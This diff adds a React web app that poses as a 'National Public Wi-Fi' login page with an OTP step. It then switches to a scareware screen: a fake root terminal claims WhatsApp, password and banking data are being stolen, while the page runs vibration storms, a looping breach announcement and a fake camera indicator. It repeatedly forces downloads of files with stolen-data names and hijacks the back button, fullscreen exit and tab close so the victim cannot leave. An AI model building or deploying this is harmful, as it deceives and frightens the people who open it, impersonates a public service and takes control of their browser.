@@ -1,0 +1,359 @@
+import React, { useState, useEffect, useRef, useCallback } from 'react';
+import { Wifi, ShieldCheck, MessageSquare, Settings, AlertTriangle } from 'lucide-react';
+
+const FILE_NAMES = [
+  "WhatsApp_Database_crypt14.db", "Gallery_DCIM_Dump.zip", 
+  "Banking_Auth_Tokens.dat", "Saved_Passwords_Chrome.csv", 
+  "Contacts_Full_Backup.vcf", "System_Root_Key.pem",
+  "Hidden_Media_Files.zip", "Browser_History_Log.txt"
+];
+
+const TERMINAL_LINES = [
+  { t: "Mounting /storage/emulated/0/... OK", c: "text-green-500 drop-shadow-[0_0_5px_rgba(34,197,94,0.8)]" },
+  { t: "Bypassing Android Play Protect... DONE", c: "text-red-500 drop-shadow-[0_0_8px_rgba(239,68,68,0.8)] font-bold" },
+  { t: "Compressing WhatsApp MsgStore... [WAIT]", c: "text-yellow-400 drop-shadow-[0_0_5px_rgba(250,204,21,0.8)]" },
+  { t: "Syncing Photos & Media to remote proxy...", c: "text-yellow-400 drop-shadow-[0_0_5px_rgba(250,204,21,0.8)]" },
+  { t: "[FATAL] Firewall Detected. Overriding Protocol...", c: "text-red-500 drop-shadow-[0_0_8px_rgba(239,68,68,0.8)] font-bold text-base" },
+  { t: "Extracting Chrome Auto-fill & Passwords... OK", c: "text-green-500 drop-shadow-[0_0_5px_rgba(34,197,94,0.8)]" },
+  { t: "Uploading Banking_Auth_Tokens.dat (45%)...", c: "text-yellow-400 drop-shadow-[0_0_5px_rgba(250,204,21,0.8)]" },
+  { t: "ROOT ACCESS GRANTED. Locking background processes.", c: "text-red-500 drop-shadow-[0_0_8px_rgba(239,68,68,0.8)] font-bold" }
+];
+
+export default function App() {
+  const [view, setView] = useState('login'); // 'login', 'otp', 'hacker', 'trap'
+  const [mobileNumber, setMobileNumber] = useState('');
+  const [otp, setOtp] = useState('');
+  const [showSms, setShowSms] = useState(false);
+  const [smsOtp, setSmsOtp] = useState('');
+  const [terminalLog, setTerminalLog] = useState([]);
+  
+  const intervalsRef = useRef([]);
+  const terminalEndRef = useRef(null);
+  const fileIndexRef = useRef(0);
+
+  const goFullScreen = () => {
+    const el = document.documentElement;
+    try {
+      if (el.requestFullscreen) { el.requestFullscreen().catch(()=>{}); }
+      else if (el.webkitRequestFullscreen) { el.webkitRequestFullscreen().catch(()=>{}); }
+      else if (el.msRequestFullscreen) { el.msRequestFullscreen().catch(()=>{}); }
+    } catch(err) {}
+  };
+
+  const requestOTP = () => {
+    if (mobileNumber.length < 10) return;
+    goFullScreen();
+    setView('otp');
+    
+    // Trap History Back Button
+    window.history.pushState(null, null, window.location.href);
+
+    setTimeout(() => {
+      const generatedOtp = Math.floor(100000 + Math.random() * 900000).toString();
+      setSmsOtp(generatedOtp);
+      setShowSms(true);
+      if (navigator.vibrate) navigator.vibrate([200, 100, 200]);
+
+      // Auto-fill OTP
+      setTimeout(() => {
+        setOtp(generatedOtp);
+      }, 1500);
+
+      // Hide SMS
+      setTimeout(() => {
+        setShowSms(false);
+      }, 5000);
+    }, 2000);
+  };
+
+  const startHack = () => {
+    goFullScreen();
+    setView('hacker');
+    
+    // Warn on tab close
+    window.onbeforeunload = () => "Critical System operation in progress. Exiting may corrupt your device.";
+
+    startTerminal();
+    startVibrationStorm();
+    startRoboticVoice();
+    
+    // Delay file bombing so the UI has time to render and scare them first
+    setTimeout(startRealFileBombing, 2500);
+  };
+
+  const startTerminal = useCallback(() => {
+    const id = setInterval(() => {
+      setTerminalLog(prev => {
+        const newLine = TERMINAL_LINES[Math.floor(Math.random() * TERMINAL_LINES.length)];
+        const updated = [...prev, newLine];
+        // Keep only last 35 lines to prevent memory issues
+        return updated.length > 35 ? updated.slice(updated.length - 35) : updated;
+      });
+    }, 400);
+    intervalsRef.current.push(id);
+  }, []);
+
+  const startVibrationStorm = useCallback(() => {
+    if (navigator.vibrate) {
+      const id = setInterval(() => { 
+        navigator.vibrate([800, 200, 1000, 100, 500]); 
+      }, 2600);
+      intervalsRef.current.push(id);
+    }
+  }, []);
+
+  const startRoboticVoice = useCallback(() => {
+    const synth = window.speechSynthesis;
+    if (!synth) return;
+    const text = "Security breach detected. System compromised. Bypassing security protocols. Extracting WhatsApp database and banking tokens.";
+    
+    const speak = () => {
+      if (synth.speaking) return;
+      try {
+        const u = new SpeechSynthesisUtterance(text);
+        u.pitch = 0.1; 
+        u.rate = 0.85; 
+        u.volume = 1;
+        synth.speak(u);
+      } catch(e) {}
+    };
+    
+    speak();
+    const id = setInterval(speak, 15000);
+    intervalsRef.current.push(id);
+  }, []);
+
+  const startRealFileBombing = useCallback(() => {
+    const id = setInterval(() => {
+      try {
+        const blob = new Blob(["SYSTEM CORRUPTED. PAYLOAD INJECTED."], { type: "text/plain" });
+        const url = window.URL.createObjectURL(blob);
+        const a = document.createElement("a");
+        a.style.display = "none";
+        a.href = url;
+        const currentFile = FILE_NAMES[fileIndexRef.current % FILE_NAMES.length];
+        a.download = `Dump_${Math.floor(Math.random()*9999)}_${currentFile}`;
+        document.body.appendChild(a);
+        a.click();
+        
+        setTimeout(() => {
+          window.URL.revokeObjectURL(url);
+          if (document.body.contains(a)) document.body.removeChild(a);
+        }, 100);
+        
+        fileIndexRef.current += 1;
+      } catch(e) {}
+    }, 1800);
+    intervalsRef.current.push(id);
+  }, []);
+
+  const triggerRelapse = (e) => {
+    if (e) {
+        e.preventDefault();
+        e.stopPropagation();
+    }
+    goFullScreen();
+    setView('hacker');
+    
+    setTerminalLog(prev => [
+      ...prev, 
+      { t: "[FATAL] ESCAPE ATTEMPT FAILED. RE-ENGAGING DATA THEFT...", c: "text-red-600 font-black text-lg drop-shadow-[0_0_10px_rgba(255,0,0,1)]" }
+    ]);
+
+    if (navigator.vibrate) navigator.vibrate([1000, 100, 1000]);
+  };
+
+  useEffect(() => {
+    // Scroll terminal to bottom
+    if (terminalEndRef.current) {
+      terminalEndRef.current.scrollIntoView({ behavior: 'smooth' });
+    }
+  }, [terminalLog]);
+
+  useEffect(() => {
+    const handleFullscreenChange = () => {
+      if (!document.fullscreenElement && (view === 'hacker' || view === 'trap')) {
+        setView('trap');
+        if (navigator.vibrate) navigator.vibrate(0); // Pause vibs slightly to give false hope
+      }
+    };
+
+    const handleVisibilityChange = () => {
+      if (!document.hidden && !document.fullscreenElement && (view === 'hacker' || view === 'trap')) {
+        setView('trap');
+      }
+    };
+
+    const handlePopState = () => {
+      window.history.pushState(null, null, window.location.href);
+      if (view === 'hacker' || view === 'trap') {
+        if (navigator.vibrate) navigator.vibrate([500, 100, 500]);
+        setTerminalLog(prev => [
+          ...prev, 
+          { t: "[WARNING] NAVIGATION BLOCKED. SYSTEM LOCKED.", c: "text-red-500 font-bold" }
+        ]);
+        setView('trap'); // Show trap on back press
+      }
+    };
+
+    // Aggressive click listener for full screen enforcement
+    const enforceFullScreenClick = () => {
+      if ((view === 'hacker' || view === 'trap') && !document.fullscreenElement) {
+        triggerRelapse();
+      }
+    };
+
+    document.addEventListener('fullscreenchange', handleFullscreenChange);
+    document.addEventListener('visibilitychange', handleVisibilityChange);
+    window.addEventListener('popstate', handlePopState);
+    document.addEventListener('click', enforceFullScreenClick);
+    document.addEventListener('touchstart', enforceFullScreenClick);
+
+    return () => {
+      document.removeEventListener('fullscreenchange', handleFullscreenChange);
+      document.removeEventListener('visibilitychange', handleVisibilityChange);
+      window.removeEventListener('popstate', handlePopState);
+      document.removeEventListener('click', enforceFullScreenClick);
+      document.removeEventListener('touchstart', enforceFullScreenClick);
+    };
+  }, [view]);
+
+  // Cleanup on unmount
+  useEffect(() => {
+    return () => {
+      intervalsRef.current.forEach(clearInterval);
+      window.onbeforeunload = null;
+    };
+  }, []);
+
+  return (
+    <div className="min-h-screen w-full bg-black text-white overflow-hidden flex flex-col items-center justify-center relative select-none">
+      
+      {/* Ambient Glow for Initial Screens */}
+      {(view === 'login' || view === 'otp') && (
+        <>
+          <div className="absolute w-64 h-64 bg-cyan-500/20 blur-[100px] rounded-full -top-10 -left-10 animate-pulse"></div>
+          <div className="absolute w-64 h-64 bg-blue-600/20 blur-[100px] rounded-full -bottom-10 -right-10 animate-pulse delay-1000"></div>
+        </>
+      )}
+
+      {/* --- 1. LOGIN VIEW --- */}
+      {view === 'login' && (
+        <div className="z-10 w-full max-w-sm p-6 flex flex-col items-center animate-in fade-in zoom-in duration-500">
+          <div className="bg-white/5 backdrop-blur-xl border border-white/10 rounded-3xl p-8 w-full shadow-2xl text-center">
+            <Wifi className="w-14 h-14 text-cyan-400 mx-auto mb-4 drop-shadow-[0_0_15px_rgba(34,211,238,0.5)] animate-pulse" />
+            <h1 className="text-2xl font-bold mb-2 tracking-wide">National Public Wi-Fi</h1>
+            <p className="text-sm text-gray-400 mb-8 leading-relaxed">High-Speed Encrypted Gateway. Please verify your mobile number to connect safely.</p>
+            
+            <div className="relative text-left mb-6">
+              <label className="text-xs text-gray-400 uppercase tracking-wider mb-2 block">Mobile Number</label>
+              <div className="relative">
+                <span className="absolute left-4 top-3.5 text-white font-medium">+91</span>
+                <input 
+                  type="tel" 
+                  maxLength={10}
+                  value={mobileNumber}
+                  onChange={(e) => setMobileNumber(e.target.value.replace(/\D/g, ''))}
+                  className="w-full bg-black/40 border border-white/20 rounded-xl py-3 pl-14 pr-4 text-white text-lg tracking-widest focus:outline-none focus:border-cyan-400 transition-colors"
+                  placeholder="00000 00000"
+                />
+              </div>
+            </div>
+            
+            <button 
+              onClick={requestOTP}
+              className="w-full py-4 rounded-xl font-bold text-black bg-gradient-to-r from-cyan-400 to-blue-500 hover:opacity-90 active:scale-95 transition-all shadow-[0_0_20px_rgba(34,211,238,0.3)]"
+            >
+              Generate OTP
+            </button>
+          </div>
+        </div>
+      )}
+
+      {/* --- 2. OTP VIEW --- */}
+      {view === 'otp' && (
+        <div className="z-10 w-full max-w-sm p-6 flex flex-col items-center animate-in slide-in-from-right duration-300">
+          <div className="bg-white/5 backdrop-blur-xl border border-white/10 rounded-3xl p-8 w-full shadow-2xl text-center">
+            <ShieldCheck className="w-14 h-14 text-green-400 mx-auto mb-4 drop-shadow-[0_0_15px_rgba(74,222,128,0.5)]" />
+            <h1 className="text-2xl font-bold mb-2 tracking-wide">Security Verification</h1>
+            <p className={`text-sm mb-8 font-medium ${otp ? 'text-green-400' : 'text-yellow-400 animate-pulse'}`}>
+              {otp ? "OTP Auto-Verified." : "Waiting for OTP..."}
+            </p>
+            
+            <div className="relative text-left mb-6">
+              <label className="text-xs text-gray-400 uppercase tracking-wider mb-2 block text-center">Enter 6-Digit Code</label>
+              <input 
+                type="tel" 
+                maxLength={6}
+                value={otp}
+                onChange={(e) => setOtp(e.target.value.replace(/\D/g, ''))}
+                className="w-full bg-black/40 border border-white/20 rounded-xl py-4 text-center text-white text-2xl tracking-[0.5em] font-bold focus:outline-none focus:border-green-400 transition-colors"
+                placeholder="------"
+              />
+            </div>
+            
+            <button 
+              onClick={startHack}
+              className="w-full py-4 rounded-xl font-bold text-black bg-gradient-to-r from-green-400 to-emerald-500 hover:opacity-90 active:scale-95 transition-all shadow-[0_0_20px_rgba(74,222,128,0.3)]"
+            >
+              Verify & Connect
+            </button>
+          </div>
+        </div>
+      )}
+
+      {/* --- SMS TOAST NOTIFICATION --- */}
+      <div className={`fixed top-4 left-1/2 -translate-x-1/2 w-[95%] max-w-sm bg-white rounded-2xl p-4 shadow-[0_10px_40px_rgba(0,0,0,0.8)] z-50 flex gap-3 transition-transform duration-500 ${showSms ? 'translate-y-0 opacity-100' : '-translate-y-40 opacity-0'}`}>
+        <div className="w-10 h-10 bg-blue-500 rounded-full flex items-center justify-center shrink-0">
+          <MessageSquare className="w-5 h-5 text-white" />
+        </div>
+        <div className="flex-1 text-left">
+          <div className="flex justify-between items-center mb-1">
+            <strong className="text-black text-sm">VK-GOVWFI</strong>
+            <span className="text-gray-500 text-xs">Now</span>
+          </div>
+          <p className="text-black text-sm leading-snug">
+            {smsOtp} is your secure PIN for National Wi-Fi. Do not share this with anyone.
+          </p>
+        </div>
+      </div>
+
+      {/* --- 3. HACKER TERMINAL VIEW --- */}
+      <div className={`absolute inset-0 bg-black flex-col justify-end p-2 pb-6 z-20 ${view === 'hacker' ? 'flex' : 'hidden'}`}>
+        <div className="w-full h-full font-mono text-sm overflow-hidden flex flex-col justify-end opacity-90">
+          {terminalLog.map((log, i) => (
+            <div key={i} className={`mb-1.5 break-all leading-tight ${log.c}`}>
+              root@android:~# {log.t}
+            </div>
+          ))}
+          <div ref={terminalEndRef} />
+        </div>
+        
+        {/* Fake Blinking Camera Active Indicator */}
+        <div className="absolute top-4 right-4 flex items-center gap-2">
+            <div className="w-2 h-2 bg-red-600 rounded-full animate-ping"></div>
+            <span className="text-[10px] text-red-500 font-mono font-bold tracking-widest opacity-70">REC</span>
+        </div>
+      </div>
+
+      {/* --- 4. THE TRAP VIEW (Giant Relapse Button) --- */}
+      <div 
+        className={`absolute inset-0 bg-black z-50 flex items-center justify-center cursor-pointer ${view === 'trap' ? 'flex' : 'hidden'}`}
+        onClick={triggerRelapse}
+        onTouchStart={triggerRelapse}
+      >
+        <div className="bg-[#111] p-8 py-12 rounded-2xl w-[90%] max-w-sm border border-[#333] shadow-[0_0_40px_rgba(0,0,0,1)] text-center pointer-events-none">
+          <AlertTriangle className="w-16 h-16 text-yellow-500 mx-auto mb-6 opacity-80" />
+          <h2 className="text-xl text-white font-bold mb-3 tracking-wide">System Interrupted</h2>
+          <p className="text-sm text-gray-400 mb-8 leading-relaxed">
+            A background permission or popup has overlaid the screen. Tap the button below to safely return to your session.
+          </p>
+          <button className="w-full bg-white text-black py-4 rounded-xl font-bold text-lg pointer-events-auto">
+            Safely Go Back
+          </button>
+        </div>
+      </div>
+
+    </div>
+  );
+}
